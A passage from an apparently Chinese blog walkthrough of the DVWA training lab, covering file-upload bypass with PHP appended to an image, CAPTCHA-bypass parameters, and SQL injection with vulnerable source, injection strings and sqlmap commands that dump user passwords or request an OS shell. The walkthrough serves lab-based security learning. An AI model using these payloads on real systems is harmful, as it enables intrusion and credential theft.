HTTP/1.1</span><br><span class=\"line\"></span><br><span class=\"line\">Host: 192.168.23.133</span><br><span class=\"line\"></span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class=\"line\"></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Length: 977</span><br><span class=\"line\"></span><br><span class=\"line\">Origin: http://192.168.23.133</span><br><span class=\"line\"></span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/upload/</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class=\"line\"></span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">100000</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Type: image/png</span><br></pre></td></tr></table></figure>\n<ul>\n<li>txt上传成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">../../hackable/uploads/a.txt succesfully uploaded!</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-5\"><a class=\"markdownIt-Anchor\" href=\"#high-5\"></a> High</h3>\n<ul>\n<li>加入内容检测和文件类型检测</li>\n<li>通过在图片中加入一句话木马实现上传</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">../../hackable/uploads/th.jpeg succesfully uploaded!</span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过文件包含漏洞解析上传图片</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg</span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210427184134233.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210427184134233.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210427184134233\" /></p>\n<h2 id=\"insecure-captcha\"><a class=\"markdownIt-Anchor\" href=\"#insecure-captcha\"></a> Insecure CAPTCHA</h2>\n<h3 id=\"low-6\"><a class=\"markdownIt-Anchor\" href=\"#low-6\"></a> Low</h3>\n<ul>\n<li>修改包的参数step=2即可。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change</span><br><span class=\"line\"></span><br><span class=\"line\">Password Changed.</span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-6\"><a class=\"markdownIt-Anchor\" href=\"#medium-6\"></a> Medium</h3>\n<ul>\n<li>修改包的参数step=2。</li>\n<li>查看源码得知新变量passed_captcha，谷歌返回情况，将其POST为true。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-6\"><a class=\"markdownIt-Anchor\" href=\"#high-6\"></a> High</h3>\n<ul>\n<li>添加如下信息至包中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: reCAPTCHA</span><br><span class=\"line\">step=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"sql-injection\"><a class=\"markdownIt-Anchor\" href=\"#sql-injection\"></a> SQL Injection</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//SQL Injection</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Was a number entered?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_numeric( <span class=\"variable\">$id</span> )) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:id&#x27;</span>, <span class=\"variable\">$id</span>, PDO::PARAM_INT );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$data</span>-&gt;fetch();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Make sure only 1 result is returned</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$data</span>-&gt;rowCount() == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Get values</span></span><br><span class=\"line\">            <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[ <span class=\"string\">&#x27;first_name&#x27;</span> ];</span><br><span class=\"line\">            <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[ <span class=\"string\">&#x27;last_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_SESSION</span> [ <span class=\"string\">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$id</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class=\"subst\">$id</span>;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$query</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Display values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// This is used later on in the index.php page</span></span><br><span class=\"line\"><span class=\"comment\">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class=\"line\"><span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"><span class=\"variable\">$number_of_rows</span> = mysqli_fetch_row( <span class=\"variable\">$result</span> )[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class=\"subst\">$id</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-7\"><a class=\"markdownIt-Anchor\" href=\"#low-7\"></a> Low</h3>\n<p>特点：GET</p>\n<ul>\n<li>1</li>\n<li>1’//wrong</li>\n<li>1’ or 1=1–</li>\n<li>1’ union select 1,database()–</li>\n<li>sqlmap</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-7\"><a class=\"markdownIt-Anchor\" href=\"#medium-7\"></a> Medium</h3>\n<p>特点：POST</p>\n<ul>\n<li>手工注入</li>\n<li>id=1 union select 1,table_name from information_schema=dvwa–</li>\n<li>HEX加密关键字</li>\n<li>id=1 union select 1,table_name from information_schema=0x64767761–</li>\n<li>sqlmap --data参数</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">脱裤</span></span><br><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">上马</span></span><br><span class=\"line\">lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">需要加绝对路径，可以利用phpinfo()</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-7\"><a class=\"markdownIt-Anchor\" href=\"#high-7\"></a> High</h3>\n<p>特点：返回到不同页面</p>\n<ul>\n<li>手动无差别</li>\n<li>sqlmap --second-url参数</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424185429439.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424185429439.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210424185429439\" /></p>\n<h2 id=\"sql-injection-blind\"><a class=\"markdownIt-Anchor\" href=\"#sql-injection-blind\"></a> SQL Injection (Blind)</h2>\n<h3 id=\"low-8\"><a class=\"markdownIt-Anchor\" href=\"#low-8\"></a> Low</h3>\n<ul>\n<li>手注过于麻烦不演示</li>\n<li>sqlmap</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-8\"><a class=\"markdownIt-Anchor\" href=\"#medium-8\"></a> Medium</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-8\"><a class=\"markdownIt-Anchor\" href=\"#high-8\"></a> High</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure>\n<h2 id=\"weak-session-ids\"><a class=\"markdownIt-Anchor\" href=\"#weak-session-ids\"></a> Weak Session IDs</h2>\n<h3 id=\"low-9\"><a class=\"markdownIt-Anchor\" href=\"#low-9\"></a> Low</h3>\n<h3 id=\"medium-9\"><a class=\"markdownIt-Anchor\" href=\"#medium-9\"></a> Medium</h3>\n<h3 id=\"high-9\"><a class=\"markdownIt-Anchor\" href=\"#high-9\"></a> High</h3>\n<h2 id=\"dom-based-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#dom-based-cross-site-scripting-xss\"></a> DOM Based Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span 